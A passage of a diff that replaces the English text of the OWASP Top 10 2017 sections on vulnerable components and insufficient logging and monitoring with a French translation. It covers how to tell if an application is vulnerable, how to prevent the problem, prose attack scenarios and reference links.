-<li>If you do not secure the components' configurations (see <strong>A6:2017-Security Misconfiguration</strong>).</li>
+<li>Si vous ne savez pas quels sont tous les composants que vous utilisez (à la fois côté client et côté serveur). Cela comprend les composants que vous utilisez directement ou par l'intermédiaire des dépendances imbriquées.</li>
+<li>Si le logiciel est vulnérable, sans support, ou obsolète. Cela concerne le système d'exploitation, le serveur web/application, le système de gestion de base de données (SGBD), les applications, APIs et autres composants, les environments d'exécution, et les bibliothèques.</li>
+<li>Si vous ne faites pas de recherche régulières de vulnérabilités et de souscription aux bulletins de sécurité des composants que vous utilisez.</li>
+<li>Si vous ne corrigez pas ni mettez à jour vos plateformes sous-jacentes, vos frameworks, et leurs dépendances sur la base d'une analyse de risque, dans un délai convenable. Cela apparaît fréquemment dans les environnements où les mises à jour sont faites sur une base mensuelle ou trimestrielle au rythme des évolutions logicielles, ce qui laisse les organisations exposées inutilement, des jours et des mois, à des failles avant de corriger les vulnérabilités.</li>
+<li>Si les développeurs de logiciels ne testent pas la compatibilité des évolutions, des mises à jour et des correctifs des bibliothèques.</li>
+<li>Si vous ne sécurisez pas les configurations des composants (voir <strong>A6:2017-Mauvaise Configuration de Sécurité</strong>).</li>
 </ul>
-<h2>How To Prevent</h2>
-<p>There should be a patch management process in place to:</p>
+<h2>Comment s'en Prémunir ?</h2>
+<p>Vous devez mettre en place une gestion des mises à jour pour:</p>
 <ul>
-<li>Remove unused dependencies, unnecessary features, components, files, and documentation.</li>
-<li>Continuously inventory the versions of both client-side and server-side components (e.g. frameworks, libraries) and their dependencies using tools like versions, DependencyCheck, retire.js, etc.</li>
-<li>Continuously monitor sources like CVE and NVD for vulnerabilities in the components. Use software composition analysis tools to automate the process. Subscribe to email alerts for security vulnerabilities related to components you use.</li>
-<li>Only obtain components from official sources over secure links. Prefer signed packages to reduce the chance of including a modified, malicious component.</li>
-<li>Monitor for libraries and components that are unmaintained or do not create security patches for older versions. If patching is not possible, consider deploying a virtual patch to monitor, detect, or protect against the discovered issue.</li>
+<li>Supprimer les dépendances inutiles et les fonctionnalités, composants, fichiers et documentation non nécessaires.</li>
+<li>Faire un inventaire en continu des versions de composants à la fois client et serveur (ex. frameworks, bibliothèques) et de leurs dépendances avec des outils tels que versions, DependencyCheck, retire.js, etc.</li>
+<li>Surveiller en permanence les sources comme CVE et NVD pour suivre les vulnérabilités des composants. Utiliser des outils d'analyse de composants logiciels pour automatiser le processus. Souscrire aux alertes par courriel concernant les vulnérabilités sur les composants que vous utilisez.</li>
+<li>Ne récupérer des composants qu'auprès de sources officielles via des liens sécurisés. Préférer des paquets signés pour minimiser les risques d'insertion de composants modifiés malicieux.</li>
+<li>Surveiller les bibliothèques et les composants qui ne sont plus maintenus ou pour lesquels il n'y a plus de correctifs de sécurité. Si les mises à jour ne sont pas possibles, penser à déployer des mises à jour virtuelles pour surveiller, détecter et se protéger d'éventuelles découvertes de failles.</li>
 </ul>
-<p>Every organization must ensure that there is an ongoing plan for monitoring, triaging, and applying updates or configuration changes for the lifetime of the application or portfolio.</p>
-<h2>Example Attack Scenarios</h2>
-<p><strong>Scenario #1</strong>: Components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact. Such flaws can be accidental (e.g. coding error) or intentional (e.g. backdoor in component). Some example exploitable component vulnerabilities discovered are:</p>
+<p>Chaque organisation doit s'assurer d'avoir un projet continu de surveillance, de tri, d'application des mises à jour et de modification de configuration pour la durée de vie d'une application ou de sa gamme.</p>
+<h2>Exemple de Scénario d'Attaque</h2>
+<p><strong>Scénario #1</strong>: Les composants s'exécutent généralement avec le même niveau de privilèges que l'application, et donc les failles d'un quelconque composant peuvent aboutir à un impact sévère. Les failles peuvent être accidentelles (ex. erreur de codage) ou intentionnelles (ex. porte dérobée dans un composant). Voici quelques exemples de découvertes de vulnérabilités exploitables de composants :</p>
 <ul>
-<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>, a Struts 2 remote code execution vulnerability that enables execution of arbitrary code on the server, has been blamed for significant breaches.</li>
-<li>While <a href="https://en.wikipedia.org/wiki/Internet_of_things">internet of things (IoT)</a> are frequently difficult or impossible to patch, the importance of patching them can be great (e.g. biomedical devices).</li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>, une vulnérabilité d'exécution à distance de Struts 2, qui permet l'éxecution de code arbitraire sur le serveur, a été responsable d'importantes violations.</li>
+<li>Bien que <a href="https://en.wikipedia.org/wiki/Internet_of_things">l'internet des objets (IoT)</a> soit souvent difficile voire impossible à mettre à jour, l'importance de ces mises à jour peut être énorme (ex. objets biomédicaux).</li>
 </ul>
-<p>There are automated tools to help attackers find unpatched or misconfigured systems. For example, the <a href="https://www.shodan.io/report/89bnfUyJ">Shodan IoT search engine</a> can help you find devices that still suffer from <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a> vulnerability that was patched in April 2014.</p>
-<h2>References</h2>
+<p>Il existe des outils automatiques qui aident les attaquants à trouver des systèmes malconfigurés ou non mis à jour. Par exemple, le <a href="https://www.shodan.io/report/89bnfUyJ">moteur de recherche IoT de Shodan</a> peut vous aider à trouver des objets qui sont encore vulnérables à la faille <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a> corrigée en Avril 2014.</p>
+<h2>Références</h2>
 <h3>OWASP</h3>
 <ul>
-<li><a href="https://www.owasp.org/index.php/ASVS_V1_Architecture">OWASP Application Security Verification Standard: V1 Architecture, design and threat modelling</a></li>
-<li><a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">OWASP Dependency Check (for Java and .NET libraries)</a></li>
-<li><a href="https://www.owasp.org/index.php/Map_Application_Architecture_(OTG-INFO-010)">OWASP Testing Guide - Map Application Architecture (OTG-INFO-010)</a></li>
-<li><a href="https://www.owasp.org/index.php/Virtual_Patching_Best_Practices">OWASP Virtual Patching Best Practices</a></li>
+<li><a href="https://www.owasp.org/index.php/ASVS_V1_Architecture">OWASP Standard de Vérification de Sécurité Applicative: V1 Architecture, conception et modélisation des menaces</a></li>
+<li><a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">OWASP Contrôle des Dépendences (pour les bibliothèques Java et .NET)</a></li>
+<li><a href="https://www.owasp.org/index.php/Map_Application_Architecture_(OTG-INFO-010)">OWASP Guide de Test - Map Application Architecture (OTG-INFO-010)</a></li>
+<li><a href="https://www.owasp.org/index.php/Virtual_Patching_Best_Practices">OWASP Meilleures pratiques de Mises à Jour Virtuelles</a></li>
 </ul>
-<h3>External</h3>
+<h3>Externes</h3>
 <ul>
-<li><a href="https://www.aspectsecurity.com/research-presentations/the-unfortunate-reality-of-insecure-libraries">The Unfortunate Reality of Insecure Libraries</a></li>
-<li><a href="https://www.cvedetails.com/version-search.php">MITRE Common Vulnerabilities and Exposures (CVE) search</a></li>
-<li><a href="https://nvd.nist.gov/">National Vulnerability Database (NVD)</a></li>
-<li><a href="https://github.com/retirejs/retire.js/">Retire.js for detecting known vulnerable JavaScript libraries</a></li>
-<li><a href="https://nodesecurity.io/advisories">Node Libraries Security Advisories</a></li>
-<li><a href="https://rubysec.com/">Ruby Libraries Security Advisory Database and Tools</a></li>
+<li><a href="https://www.aspectsecurity.com/research-presentations/the-unfortunate-reality-of-insecure-libraries">La regrettable réalité des bibliothèques non sécurisées</a></li>
+<li><a href="https://www.cvedetails.com/version-search.php">L'organisation MITRE maintient le dictionnaire de recherche des Common Vulnerabilities and Exposures (CVE)</a></li>
+<li><a href="https://nvd.nist.gov/">Base de Données Nationale de Vulnérabilité (NVD)</a></li>
+<li><a href="https://github.com/retirejs/retire.js/">Retire.js pour la détection de vulnérabilités connues des bibliothèques JavaScript</a></li>
+<li><a href="https://nodesecurity.io/advisories">Bibliothèques des alertes de Sécurité Node.js</a></li>
+<li><a href="https://rubysec.com/">Base de Données des alertes de Sécurité des bibliothèques Ruby et Outils</a></li>
 </ul>
-<h1>A10:2017 Insufficient Logging and Monitoring</h1>
+<h1>A10:2017 Supervision et Journalisation Insuffisantes</h1>
 <table>
 <colgroup>
 <col style="width: 33%" />
@@ -945,51 +920,51 @@
 </colgroup>
 <thead>
 <tr class="header">
-<th>Threat agents/Attack vectors</th>
-<th>Security Weakness</th>
+<th>Facteurs de Menace/Vecteurs d'Attaque</th>
+<th>Vulnérabilités</th>
 <th>Impacts</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td>Access Lvl : Exploitability 2</td>
-<td>Prevalence 3 : Detectability 1</td>
-<td>Technical 2 : Business</td>
+<td>Accès Lvl : Exploitation 2</td>
+<td>Fréquence 3 : Détection 1</td>
+<td>Techniques 2 : Métier ?</td>
 </tr>
 <tr class="even">
-<td>Exploitation of insufficient logging and monitoring is the bedrock of nearly every major incident. Attackers rely on the lack of monitoring and timely response to achieve their goals without being detected.</td>
-<td>This issue is included in the Top 10 based on an <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">industry survey</a>. One strategy for determining if you have sufficient monitoring is to examine the logs following penetration testing. The testers' actions should be recorded sufficiently to understand what damages they may have inflicted.</td>
-<td>Most successful attacks start with vulnerability probing. Allowing such probes to continue can raise the likelihood of successful exploit to nearly 100%. In 2016, identifying a breach took an <a href="https://www-01.ibm.com/common/ssi/cgi-bin/ssialias?htmlfid=SEL03130WWEN&amp;">average of 191 days</a> – plenty of time for damage to be inflicted.</td>
+<td>L’exploitation des insuffisances de supervision et de journalisation sont à la base de presque tous les incidents majeurs. Les carences dans la supervision et la gestion de réactions, rapides et adéquates, permettent aux attaquants de réaliser leurs objectifs sans être détectés.</td>
+<td>Ce problème a été intégré dans le Top 10 suite à l’enquête auprès d’un panel d’entreprises (voir <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">enquête industrie</a>). Une des méthodes pour s’assurer que vous avez une journalisation suffisante est de contrôler les journaux après un test d’intrusion. La journalisation des actions du testeur doit permettre de comprendre quels dommages ont été faits.</td>
+<td>La plupart des attaques réussies commencent par des tests de vulnérabilités. Laisser faire de tels tests en continu conduira à une exploitation réussie avec une probabilité proche de 100%. En 2016, reconnaître une attaque prenait <a href="https://www-01.ibm.com/common/ssi/cgi-bin/ssialias?htmlfid=SEL03130WWEN&amp;">en moyenne 191 jours</a>, ce qui laisse beaucoup de temps pour faire des dégâts.</td>
 </tr>
 </tbody>
 </table>
-<h2>Is the Application Vulnerable?</h2>
-<p>Insufficient logging, detection, monitoring and active response occurs any time:</p>
+<h2>Suis-je Vulnérable ?</h2>
+<p>L'insuffisance de journalisation, de détection, de supervision et de réaction aux incidents est avérée si :</p>
 <ul>
-<li>Auditable events, such as logins, failed logins, and high-value transactions are not logged.</li>
-<li>Warnings and errors generate no, inadequate, or unclear log messages.</li>
-<li>Logs of applications and APIs are not monitored for suspicious activity.</li>
-<li>Logs are only stored locally.</li>
-<li>Appropriate alerting thresholds and response escalation processes are not in place or effective.</li>
-<li>Penetration testing and scans by <a href="https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools">DAST</a> tools (such as <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP ZAP</a>) do not trigger alerts.</li>
-<li>The application is unable to detect, escalate, or alert for active attacks in real time or near real time.</li>
+<li>Les traces d’audit, telles que les accès réussis ou échoués et les transactions sensibles, ne sont pas enregistrées.</li>
+<li>Les alertes et les erreurs générées ne sont pas enregistrées, ou leur journalisation est inadéquate, ou imprécise.</li>
+<li>Les journaux des applications et des APIs ne sont pas contrôlés pour détecter les actions suspectes.</li>
+<li>Les journaux ne sont stockés que localement.</li>
+<li>Aucun processus de seuil d’alerte convenable ni de remontées d'information pour y répondre n'ont été définis, ou ils sont inadéquats, ou inefficaces.</li>
+<li>Les tests d'intrusion et de balayage avec des outils <a href="https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools">DAST</a> (tels que <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP ZAP</a>) ne génèrent pas d'alertes.</li>
+<li>L’application ne détecte pas, ne génère pas de remontées d'information ni d’alerte en temps réel, ou assimilé, en cas d’attaque active.</li>
 </ul>
-<p>You are vulnerable to information leakage if you make logging and alerting events visible to a user or an attacker (see A3:2017-Sensitive Information Exposure).</p>
-<h2>How To Prevent</h2>
-<p>As per the risk of the data stored or processed by the application:</p>
+<p>Vous êtes vulnérable à une fuite d’information si les enregistrements de journalisation et d’alertes sont accessibles à vos utilisateurs et attaquants (voir A3:2017-Exposition de Données Sensibles).</p>
+<h2>Comment s'en Prémunir ?</h2>
+<p>Conformément aux risques évalués sur les données stockées ou gérées par l'application :</p>
 <ul>
-<li>Ensure all login, access control failures, and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts, and held for sufficient time to allow delayed forensic analysis.</li>
-<li>Ensure that logs are generated in a format that can be easily consumed by a centralized log management solutions.</li>
-<li>Ensure high-value transactions have an audit trail with integrity controls to prevent tampering or deletion, such as append-only database tables or similar.</li>
-<li>Establish effective monitoring and alerting such that suspicious activities are detected and responded to in a timely fashion.</li>
-<li>Establish or adopt an incident response and recovery plan, such as <a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a> or later.</li>
+<li>S'assurer que toutes les authentifications, les erreurs de contrôle d'accès et de contrôle des entrées côté serveur sont enregistrées, avec un contexte utilisateur suffisant pour identifier les comptes suspects ou malveillants, et conservées suffisamment longtemps pour permettre une analyse légale différée.</li>
+<li>S'assurer que les enregistrements des journaux sont dans un format standard pour permettre des les intégrer facilement à une solution de gestion de logs centralisée.</li>
+<li>S'assurer que les transactions à haute valeur ajoutée ont une piste d'audit, avec un contrôle d'intégrité pour éviter la modification ou la suppression comme des tables de bases de données en ajout seul ou équivalent.</li>
+<li>Mettre en place une supervision et une gestion d'alertes efficaces pour détecter et réagir aux actions suspectes en temps opportun.</li>
+<li>Définir ou adopter un plan de réaction et de reprise sur incident, comme celui du <a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a> ou ultérieur.</li>
 </ul>
-<p>There are commercial and open source application protection frameworks such as <a href="https://www.owasp.org/index.php/OWASP_AppSensor_Project">OWASP AppSensor</a>, web application firewalls such as <a href="https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project">ModSecurity with the OWASP ModSecurity Core Rule Set</a>, and log correlation software with custom dashboards and alerting.</p>
-<h2>Example Attack Scenarios</h2>
-<p><strong>Scenario #1</strong>: An open source project forum software run by a small team was hacked using a flaw in its software. The attackers managed to wipe out the internal source code repository containing the next version, and all of the forum contents. Although source could be recovered, the lack of monitoring, logging or alerting led to a far worse breach. The forum software project is no longer active as a result of this issue.</p>
-<p><strong>Scenario #2</strong>: An attacker uses scans for users using a common password. They can take over all accounts using this password. For all other users, this scan leaves only one false login behind. After some days, this may be repeated with a different password.</p>
-<p><strong>Scenario #3</strong>: A major US retailer reportedly had an internal malware analysis sandbox analyzing attachments. The sandbox software had detected potentially unwanted software, but no one responded to this detection. The sandbox had been producing warnings for some time before the breach was detected due to fraudulent card transactions by an external bank.</p>
-<h2>References</h2>
+<p>On trouve des logiciels, commerciaux ou open source, de protection d'applications tel que <a href="https://www.owasp.org/index.php/OWASP_AppSensor_Project">OWASP AppSensor</a>, de pare-feux d'application web, tel que <a href="https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project">ModSecurity with the OWASP ModSecurity Core Rule Set</a>, et de logiciels de corrélation de journaux avec des tableaux de bord et d'alertes configurables.</p>
+<h2>Exemples de Scénarios d'Attaque</h2>
+<p><strong>Scénario #1</strong>: : Un forum, pour un projet de développement open source d’une petite équipe, a été piraté à cause d’une faille logicielle. Les attaquants ont effacé le dépôt du code source de la future version et tout le contenu du forum. Bien que le code ait pu être récupéré, le manque de supervision, de journalisation et d’alertes ont conduit à la pire violation. Le résultat est que le projet a été arrêté.<br />
+<strong>Scénario #2</strong>: : Un attaquant teste des accès utilisateur avec un mot de passe commun. Il pourra accéder à tous les comptes ayant ce mot de passe. Pour tous les autres utilisateurs, ce test ne laisse qu'une trace de tentative d'accès échoué. Quelques jours après, ce test peut être réalisé avec un autre mot de passe.<br />
+<strong>Scénario #3</strong>: Un grand distributeur américain a rapporté qu'une sandbox d’analyse de malware de fichiers attachés, aurait détecté un logiciel suspect mais que personne n'a réagi à cette détection. Il y a eu plusieurs alertes avant que la brèche ne soit découverte par une banque externe à cause d'une transaction par carte frauduleuse.</p>
+<h2>Références</h2>
 <h3>OWASP</h3>
 <ul>
 <li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#8:_Implement_Logging_and_Intrusion_Detection">OWASP Proactive Controls: Implement Logging and Intrusion Detection</a></li>
@@ -997,7 +972,7 @@
 <li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Testing Guide: Testing for Detailed Error Code</a></li>
 <li><a href="https://www.owasp.org/index.php/Logging_Cheat_Sheet">OWASP Cheat Sheet: Logging</a></li>
 </ul>
-<h3>External</h3>
+<h3>Externes</h3>
 <ul>
 <li><a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></li>
 <li><a href="https://cwe.mitre.org/data/definitions/778.html">CWE-778: Insufficient Logging</a></li>
